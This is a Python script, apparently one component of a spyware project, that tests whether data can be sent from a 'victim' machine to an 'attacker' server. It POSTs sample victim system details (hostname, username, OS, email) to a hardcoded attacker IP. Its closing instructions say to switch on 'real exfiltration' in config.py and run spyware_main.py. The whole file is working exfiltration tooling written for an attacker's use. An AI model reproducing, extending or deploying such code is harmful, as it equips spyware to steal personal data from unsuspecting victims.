"""
Quick Test Script - Verify Exfiltration Setup
Tests if data can be sent from victim to attacker server

USAGE:
    1. Start attacker_server.py on attacker machine
    2. Update ATTACKER_URL below with your attacker IP
    3. Run this script: python test_exfiltration.py
    4. Check if attacker server receives test data
"""

import sys
import os

# Try to import requests
try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False
    print("✗ Error: 'requests' library not installed")
    print("  Install with: pip install requests")
    sys.exit(1)

# Configuration
ATTACKER_URL = "http://192.168.1.100:5000/receive"  # ⚠️ CHANGE THIS TO YOUR IP

def test_connection():
    """Test if attacker server is reachable"""
    print("\n" + "="*70)
    print("🧪 EXFILTRATION TEST")
    print("="*70)
    
    print(f"\nTarget: {ATTACKER_URL}")
    print("\nStep 1: Testing connection to attacker server...")
    
    try:
        # Try to reach status endpoint
        status_url = ATTACKER_URL.replace("/receive", "/status")
        response = requests.get(status_url, timeout=5)
        
        if response.status_code == 200:
            print("  ✓ Attacker server is online and reachable")
            return True
        else:
            print(f"  ✗ Server returned error: {response.status_code}")
            return False
            
    except requests.exceptions.ConnectionError:
        print("  ✗ Cannot connect to attacker server")
        print(f"  - Check if attacker_server.py is running")
        print(f"  - Verify IP address: {ATTACKER_URL}")
        print(f"  - Test with: curl {status_url}")
        return False
    except Exception as e:
        print(f"  ✗ Connection error: {e}")
        return False

def send_test_data():
    """Send test data to attacker"""
    print("\nStep 2: Sending test data...")
    
    # Create test payload
    test_data = {
        "test": True,
        "message": "This is a test exfiltration",
        "victim_data": {
            "system_info": {
                "hostname": "TEST-PC",
                "username": "test_user",
                "os": "Windows 10",
                "ip_address": "192.168.1.999",
                "victim_email": "test@example.com"
            }
        },
        "spyware_status": "Testing mode"
    }
    
    try:
        response = requests.post(
            ATTACKER_URL,
            json=test_data,
            headers={'Content-Type': 'application/json'},
            timeout=10
        )
        
        if response.status_code == 200:
            print("  ✓ Test data sent successfully!")
            print(f"  - Server response: {response.json().get('message', 'OK')}")
            return True
        else:
            print(f"  ✗ Server error: {response.status_code}")
            return False
            
    except Exception as e:
        print(f"  ✗ Failed to send data: {e}")
        return False

def show_results(success):
    """Show test results"""
    print("\n" + "="*70)
    if success:
        print("✅ EXFILTRATION TEST PASSED")
        print("="*70)
        print("\nYour setup is working correctly!")
        print("\nNext steps:")
        print("  1. Check attacker_server.py console - you should see test data")
        print("  2. Check received_victim_data/ folder for JSON file")
        print("  3. Update config.py with this URL:")
        print(f"     ATTACKER_URL = \"{ATTACKER_URL}\"")
        print("  4. Set USE_REAL_EXFILTRATION = True in config.py")
        print("  5. Run spyware_main.py to test real exfiltration")
    else:
        print("❌ EXFILTRATION TEST FAILED")
        print("="*70)
        print("\nTroubleshooting:")
        print("  1. Make sure attacker_server.py is running")
        print("  2. Verify the IP address in ATTACKER_URL (line 16)")
        print("  3. Check firewall settings (allow port 5000)")
        print("  4. Test connectivity: ping <attacker_ip>")
        print("  5. Try accessing in browser: http://<attacker_ip>:5000/status")
    print("="*70 + "\n")

def main():
    # Test connection
    if not test_connection():
        show_results(False)
        return
    
    # Send test data
    success = send_test_data()
    
    # Show results
    show_results(success)

if __name__ == "__main__":
    main()
